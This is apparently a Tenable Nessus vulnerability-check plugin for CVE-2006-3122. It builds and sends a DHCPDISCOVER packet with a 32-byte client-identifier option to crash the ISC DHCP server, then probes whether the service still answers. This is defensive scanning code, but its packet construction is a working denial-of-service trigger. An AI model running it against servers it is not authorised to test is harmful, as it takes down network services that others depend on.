#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22159);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/07/06 13:44:22 $");

  script_cve_id("CVE-2006-3122");
  script_bugtraq_id(19348);
  script_osvdb_id(27774);

  script_name(english:"ISC DHCP Server supersede_lease() Function DHCPDISCOVER Packet DoS");
  script_summary(english:"Tries to crash the remote DHCP server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote DHCP server is affected by a denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The ISC DHCP server running on the remote host is affected by a denial
of service vulnerability in the supersede_lease() function within file
memory.c due to improper handling of DHCPDISCOVER packets that have a
client-identifier option that is exactly 32 bytes long. An
unauthenticated, remote attacker can exploit this to cause the server
to exit unexpectedly.");
  script_set_attribute(attribute:"see_also", value:"https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=380273");
  script_set_attribute(attribute:"see_also", value:"https://www.debian.org/security/2006/dsa-1143");
  script_set_attribute(attribute:"see_also", value:"https://lists.debian.org/debian-security-announce/2006/msg00232.html");
  script_set_attribute(attribute:"solution", value:
"Contact the vendor for a patch or upgrade.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/07/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/08/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("dhcp.nasl");
  script_require_keys("DHCP/Running");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("raw.inc");

get_kb_item_or_exit("DHCP/Running");

sport = 68;
dport = 67;
zero = raw_string(0);
req_good =
  mkbyte(1) +                          # Message type (1 => Boot request)
  mkbyte(1) +                          # hardware type (1 => ethernet)
  mkbyte(6) +                          # hardware address length
  mkbyte(0) +                          # hops
  mkdword(rand()) +                    # transaction id
  mkword(0) +                          # seconds elapsed
  mkword(0) +                          # bootp flags
  mkdword(0) +                         # client IP address
  mkdword(0) +                         # your (client) IP address
  mkdword(0) +                         # next server IP address
  mkdword(0) +                         # relay agent IP address
  mkdword(0xffffffff) + mkword(0xffff) + # client MAC address
  crap(data:zero, length:10) +         # ?
  crap(data:zero, length:64) +         # server host name
  crap(data:zero, length:128) +        # boot file name
  mkdword(0x63825363) +                # magic cookie
  mkbyte(53) + mkbyte(1) + mkbyte(1) + # option 53, DHCP message type = DHCP Discover
  mkbyte(255);

req_not_so_good =
  mkbyte(1) +                          # Message type (1 => Boot request)
  mkbyte(1) +                          # hardware type (1 => ethernet)
  mkbyte(6) +                          # hardware address length
  mkbyte(0) +                          # hops
  mkdword(rand()) +                    # transaction id
  mkword(0) +                          # seconds elapsed
  mkword(0) +                          # bootp flags
  mkdword(0) +                         # client IP address
  mkdword(0) +                         # your (client) IP address
  mkdword(0) +                         # next server IP address
  mkdword(0) +                         # relay agent IP address
  mkdword(0xffffffff) + mkword(0xffff) + # client MAC address
  crap(data:zero, length:10) +         # ?
  crap(data:zero, length:64) +         # server host name
  crap(data:zero, length:128) +        # boot file name
  mkdword(0x63825363) +                # magic cookie
  mkbyte(53) + mkbyte(1) + mkbyte(1) + # option 53, DHCP message type = DHCP Discover
  mkbyte(61) + mkbyte(32) +            # option 61, client id
  crap(32) +
  mkbyte(255);

global_var dport, sport;

function dhcp_send_recv(request)
{
  if (isnull(request)) return NULL;

  local_var filter, ip, pkt, res, udp;

  ip = ip();
  udp = udp(
    uh_dport : dport,
    uh_sport : sport
  );
  pkt = mkpacket(ip, udp, payload(request));

  filter = string(
    "udp and ",
    "src host ", get_host_ip(), " and ",
    "src port ", dport, " and ",
    "dst port ", sport
  );
  res = send_packet(pkt, pcap_active:TRUE, pcap_filter:filter);
  if (isnull(res)) return NULL;
  return (get_udp_element(udp:res, element:'data'));
}

# Send several valid requests to ensure the server is accessible and functioning normally
for (i=0; i<3; i++)
{
  res = dhcp_send_recv(request:req_good);
  if (
    strlen(res) < 8 ||
    getbyte(blob:res, pos:0) != 2 ||
    substr(res, 4, 7) != substr(req_good, 4, 7)
  ) exit(0, "The remote DHCP service is not configured to allow multiple requests, or it is not functioning normally.");
}

# Try the exploit.
dhcp_send_recv(request:req_not_so_good);

# There's a problem if we can't get a response any more.
res = dhcp_send_recv(request:req_good);
if (isnull(res)) security_warning(port:dport, protocol:"udp");
